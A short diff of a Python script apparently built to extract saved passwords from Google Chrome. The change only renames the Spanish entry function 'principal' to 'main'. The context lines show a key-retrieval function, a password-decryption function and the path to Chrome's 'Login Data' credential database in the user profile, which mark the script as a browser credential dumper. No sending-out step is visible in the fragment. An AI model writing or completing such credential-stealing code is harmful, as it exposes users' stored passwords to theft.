@@ -35,7 +35,7 @@ def descifrar_password(password, clave):
         except:
             return ""
         
-def principal():
+def main():
     clave = obtener_clave_cifrado()
     ruta_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "default", "Login Data")
@@ -73,4 +73,4 @@ def principal():
         pass
 
 if __name__ == "__main__":
-    principal()
+    main()
